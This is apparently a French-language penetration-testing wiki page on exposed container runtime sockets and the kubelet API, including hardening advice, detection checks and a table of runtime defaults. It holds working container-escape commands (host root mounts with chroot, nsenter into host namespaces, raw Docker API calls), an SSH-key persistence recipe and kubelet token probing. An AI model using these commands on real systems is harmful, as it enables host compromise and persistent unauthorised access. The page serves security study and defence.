# Exposition de l'API du runtime et du daemon

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

De nombreuses compromissions réelles de conteneurs ne commencent pas du tout par un namespace escape. Elles commencent par un accès au plan de contrôle du runtime. Si un workload peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman ou kubelet via un socket Unix monté ou un listener TCP exposé, l'attaquant peut être en mesure de demander la création d'un nouveau conteneur avec de meilleurs privilèges, de monter le système de fichiers de l'hôte, de rejoindre les namespaces de l'hôte ou de récupérer des informations sensibles sur le nœud. Dans ces cas, l'API du runtime constitue la véritable frontière de sécurité, et sa compromission revient fonctionnellement à compromettre l'hôte.

C'est pourquoi l'exposition du socket du runtime doit être documentée séparément des protections du kernel. Un conteneur doté d'un seccomp ordinaire, de capabilities et d'un confinement MAC peut tout de même être à un seul appel d'API de la compromission de l'hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l'intérieur de celui-ci. L'isolation kernel du conteneur actuel peut fonctionner exactement comme prévu, tandis que le plan de gestion du runtime reste entièrement exposé.

## Modèles d'accès au daemon

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local à l'adresse `unix:///var/run/docker.sock`. Historiquement, il a également été exposé à distance via des listeners TCP tels que `tcp://0.0.0.0:2375` ou un listener protégé par TLS sur le port `2376`. Exposer le daemon à distance sans TLS robuste ni authentification des clients transforme effectivement l'API Docker en interface root distante.

containerd, CRI-O, Podman et kubelet exposent des surfaces similaires à fort impact. Les noms et les workflows diffèrent, mais la logique reste la même. Si l'interface permet à l'appelant de créer des workloads, de monter des chemins de l'hôte, de récupérer des credentials ou de modifier des conteneurs en cours d'exécution, l'interface est un canal de gestion privilégié et doit être traité comme tel.

Les chemins locaux courants à vérifier sont :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Les stacks plus anciennes ou plus spécialisées peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ils sont moins courants dans les environnements modernes, mais lorsqu'ils sont présents, ils doivent être traités avec la même prudence, car ils représentent des surfaces de contrôle du runtime plutôt que de simples sockets d'application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et, de préférence, par une authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L'ancienne habitude d'ouvrir le daemon Docker sur HTTP non chiffré par commodité est l'une des erreurs les plus dangereuses de l'administration des conteneurs, car la surface d'API est suffisamment puissante pour créer directement des conteneurs privilégiés.

Le modèle historique de configuration de Docker ressemblait à ceci :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur les hôtes basés sur systemd, la communication avec le daemon peut également apparaître sous la forme `fd://`, ce qui signifie que le processus hérite d’un socket préouvert par systemd au lieu de l’attacher directement lui-même. La leçon importante ne concerne pas la syntaxe exacte, mais la conséquence en matière de sécurité. Dès que le daemon écoute au-delà d’un socket local soumis à des permissions strictes, la sécurité du transport et l’authentification des clients deviennent obligatoires plutôt que de simples mesures de hardening.

## Abus

Si un socket de runtime est présent, vérifiez lequel c’est, si un client compatible existe et si un accès HTTP ou gRPC brut est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ces commandes sont utiles, car elles permettent de faire la différence entre un chemin mort, un socket monté mais inaccessible et une API privilégiée active. Si le client réussit, la question suivante est de savoir si l'API peut lancer un nouveau container avec un bind mount de l'hôte ou un partage de namespace de l'hôte.

### Lorsqu'aucun client n'est installé

L'absence de `docker`, `podman` ou d'un autre CLI convivial ne signifie pas que le socket est sûr. Docker Engine utilise HTTP via son socket Unix, et Podman expose à la fois une API compatible avec Docker et une API native Libpod via `podman system service`. Cela signifie qu'un environnement minimal disposant uniquement de `curl` peut tout de même suffire à piloter le daemon :
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Cela est important pendant la post-exploitation, car les défenseurs suppriment parfois les binaires client habituels, mais laissent le socket de gestion monté. Sur les hosts Podman, n'oubliez pas que le chemin à forte valeur diffère selon les déploiements rootful et rootless : `unix:///run/podman/podman.sock` pour les instances de service rootful et `unix://$XDG_RUNTIME_DIR/podman/podman.sock` pour celles rootless.

### Exemple complet : Docker Socket vers la racine du host

Si `docker.sock` est accessible, l'escape classique consiste à démarrer un nouveau container qui monte le système de fichiers racine du host, puis à y exécuter `chroot` :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela fournit une exécution directe en root sur l'hôte via le daemon Docker. L'impact ne se limite pas à la lecture de fichiers. Une fois dans le nouveau container, l'attaquant peut modifier les fichiers de l'hôte, récupérer des identifiants, implanter une persistence ou démarrer des workloads supplémentaires avec des privilèges élevés.

### Exemple complet : Docker Socket vers les namespaces de l'hôte

Si l'attaquant préfère entrer dans les namespaces plutôt que d'utiliser un accès limité au système de fichiers :
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ce chemin atteint l’hôte en demandant au runtime de créer un nouveau conteneur avec une exposition explicite des namespaces de l’hôte, plutôt qu’en exploitant le conteneur actuel.

### Modèle de persistance via Docker Socket

Le contrôle du runtime peut également être utilisé à des fins de persistance plutôt que pour obtenir un shell ponctuel. Le modèle générique consiste à créer un conteneur auxiliaire avec un montage de l’hôte, à écrire des éléments d’accès autorisés ou un hook de démarrage dans le système de fichiers de l’hôte monté, puis à vérifier que l’hôte les utilise.

Forme d’exemple :
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La même idée peut cibler des unités systemd, des fragments cron, des fichiers de démarrage d’application ou des clés SSH, selon ce que l’opérateur veut démontrer. L’important est que la modification persistante soit effectuée via l’autorité du daemon runtime sur le système de fichiers de l’hôte, et non grâce à des privilèges supplémentaires dans le conteneur d’origine.

### Raw Docker API Helper Pivot

Lorsque la Docker CLI est absente, le même flux avec un helper et un host mount peut être exécuté via HTTP sur le socket Unix. Le flux générique est le suivant : confirmer l’API, créer un conteneur helper avec un bind mount vers l’hôte, le démarrer, créer une instance exec, puis démarrer cet exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La requête finale `/exec/<id>/start` dépend de l’ID exec renvoyé, mais le point de sécurité est indépendant de la gestion JSON exacte : un accès direct à l’API d’un daemon Docker rootful suffit pour demander une charge de travail auxiliaire plus privilégiée.

### Exemple complet : socket containerd

Un socket `containerd` monté est généralement tout aussi dangereux :<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si un client davantage similaire à Docker est présent, `nerdctl` peut être plus pratique que `ctr`, car il expose des options familières telles que `--privileged`, `--pid=host` et `-v` :
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L’impact est à nouveau une compromission de l’hôte. Même si les outils spécifiques à Docker sont absents, une autre runtime API peut toujours offrir les mêmes privilèges administratifs. Sur les nœuds Kubernetes, `crictl` peut également suffire pour la reconnaissance et l’interaction avec les containers, car il communique directement avec l’endpoint CRI.

### BuildKit Socket

`buildkitd` est facile à négliger, car on le considère souvent comme « seulement le backend de build », mais le daemon reste malgré tout un plan de contrôle privilégié. Un `buildkitd.sock` accessible peut permettre à un attaquant d’exécuter des étapes de build arbitraires, d’inspecter les capacités du worker, d’utiliser des contextes locaux provenant de l’environnement compromis et de demander des entitlements dangereux tels que `network.host` ou `security.insecure` lorsque le daemon a été configuré pour les autoriser.

Les premières interactions utiles sont les suivantes :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si le daemon accepte des requêtes de build, vérifiez si des entitlements non sécurisés sont disponibles :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L’impact exact dépend de la configuration du daemon, mais un service BuildKit rootful avec des entitlements permissifs n’est pas une simple commodité inoffensive pour les développeurs. Considérez-le comme une autre surface administrative à haute valeur, en particulier sur les CI runners et les nœuds de build partagés.

### API Kubelet sur TCP

Le kubelet n’est pas un container runtime, mais il fait tout de même partie du plan de gestion du nœud et se trouve souvent dans la même zone de confiance. Si le port sécurisé `10250` du kubelet est accessible depuis le workload, ou si des identifiants de nœud, des kubeconfigs ou des droits de proxy sont exposés, l’attaquant peut être en mesure d’énumérer les Pods, de récupérer les logs ou d’exécuter des commandes dans des containers locaux au nœud sans jamais passer par le chemin d’admission de l’API server Kubernetes.

Commencez par une découverte peu coûteuse :
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si le chemin proxy du kubelet ou de l’API-server autorise `exec`, un client compatible WebSocket peut l’exploiter pour obtenir une code execution dans d’autres conteneurs du nœud. C’est également pourquoi `nodes/proxy` avec la seule permission `get` est plus dangereux qu’il n’y paraît : la requête peut tout de même atteindre des endpoints du kubelet qui exécutent des commandes, et ces interactions directes avec le kubelet n’apparaissent pas dans les journaux d’audit Kubernetes normaux.<sup>[[2]](#references)</sup>

## Vérifications

L’objectif de ces vérifications est de déterminer si le conteneur peut atteindre un quelconque management plane qui aurait dû rester en dehors de la trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Ce qui est intéressant ici :

- Un runtime socket monté constitue généralement une primitive d’administration directe, et pas une simple divulgation d’informations.
- Un TCP listener sur `2375` sans TLS doit être traité comme une condition de remote compromise.
- Des variables d’environnement telles que `DOCKER_HOST` révèlent souvent que le workload a été intentionnellement conçu pour communiquer avec le runtime de l’hôte.

## Runtime Defaults

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local par défaut | `dockerd` écoute sur le socket local et le daemon s’exécute généralement en rootful | montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI daemonless par défaut | Aucun daemon privilégié persistant n’est requis pour l’utilisation locale ordinaire ; des API sockets peuvent néanmoins être exposés lorsque `podman system service` est activé | exposition de `podman.sock`, exécution du service de manière trop large, utilisation d’une API rootful |
| containerd | Socket local privilégié | L’API d’administration est exposée via le socket local et généralement utilisée par des outils de niveau supérieur | montage de `containerd.sock`, accès large à `ctr` ou `nerdctl`, exposition de namespaces privilégiés |
| CRI-O | Socket local privilégié | Le endpoint CRI est destiné aux composants de confiance locaux au node | montage de `crio.sock`, exposition du endpoint CRI à des workloads non fiables |
| Kubernetes kubelet | API de management locale au node | Kubelet ne devrait pas être largement accessible depuis les Pods ; l’accès peut exposer l’état des Pods, des credentials et des fonctionnalités d’exécution selon l’authn/authz | montage de sockets ou de certificats kubelet, auth kubelet faible, host networking avec un endpoint kubelet accessible |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
